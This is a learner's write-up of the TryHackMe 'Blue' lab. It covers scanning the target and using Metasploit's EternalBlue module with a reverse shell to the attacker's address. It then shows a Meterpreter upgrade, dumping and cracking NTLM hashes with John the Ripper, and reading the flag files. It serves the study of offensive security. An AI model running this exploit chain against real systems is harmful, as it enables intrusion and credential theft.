# Blue-THM-Walkthrough

This is my first documented CTF walkthrough, focused on the TryHackMe machine **Blue**, which explores the famous **EternalBlue** vulnerability (MS17-010).

I am currently progressing through the TryHackMe learning path, and this machine provided a solid hands-on experience. Completing Blue allowed me to apply enumeration techniques, exploit development, privilege escalation, and post-exploitation activities in a controlled environment.

This document presents each step I followed, explaining the methods, tools, and decisions throughout the exploitation process.

---

## Task 1 — Scanning the Machine

The first step was to perform an initial enumeration of the target machine using Nmap. I opted for a quick scan of the most common ports to identify accessible services.

**Command used:**

```bash
nmap -vv -F 10.10.40.249
```

**Results:**

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
```

The presence of port 445 indicated that SMB was available on the machine. After researching, I discovered that SMB services on this port have been associated with the EternalBlue vulnerability (MS17-010).

---

## Task 2 — Exploiting EternalBlue

After confirming that SMB was available, I proceeded to exploit the machine using Metasploit and the EternalBlue module.

**Commands used:**

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.40.249
set LHOST 10.9.2.36
set payload windows/x64/shell/reverse_tcp
run
```

After executing the exploit, I gained shell access to the target system.

---

## Task 3 — Upgrading Shell and Privilege Escalation

Upon gaining the initial shell, I upgraded it to a Meterpreter session to have better control and post-exploitation options.

**Commands used:**

```bash
sessions -u 1
sessions-i 2
```

After upgrading, I verified the current privileges:

```bash
getuid
```

The session confirmed that I was running as:

```
NT AUTHORITY\SYSTEM
```

I also listed running processes:

```bash
ps
```

And migrated into a stable SYSTEM process to avoid losing the session:

```bash
migrate <PID>
```

---

## Task 4 — Dumping and Cracking Password Hashes

With SYSTEM privileges, I dumped the local password hashes using Meterpreter.

**Command used:**

```bash
hashdump
```

**Results:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

I identified a non-default user account: **Jon**.

I then proceeded to crack Jon's password hash using **John the Ripper** with the **rockyou.txt** wordlist.

**Commands used:**

```bash
echo 'jon:ffb43f0de35be4d9917ac0cc8ad57f8d' > jon.hash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon.hash
john --show jon.hash
```

## Task 5 — Locating the Three Flags

The final step was to locate three flags hidden within the system.

### Flag 1 — Root of C:\

Navigated to the root directory and found the first flag.

```bash
cd C:\
dir
type flag1.txt
```

**Flag 1 Content:**

```
flag{access_the_machine}
```

---

### Flag 2 — Password Storage Location (SAM)

Navigated to the SAM database location inside Windows and retrieved the second flag.

```bash
cd C:\Windows\System32\config
dir
type flag2.txt
```

**Flag 2 Content:**

```
flag{sam_database_elevated_access}
```

---

### Flag 3 — Administrator's Documents

Navigated to the user's personal documents to find the third flag.

```bash
cd C:\Users\Jon\Documents
dir
type flag3.txt
```

**Flag 3 Content:**

```
flag{<your_flag_here>}
```

---

## Final Thoughts

This machine offered a complete exploitation chain: from scanning and enumeration to full system compromise and post-exploitation activities.

Completing Blue helped reinforce the importance of methodical enumeration, understanding vulnerabilities, and maintaining stability during post-exploitation phases.

This was a solid exercise in real-world attack techniques against misconfigured and vulnerable systems.
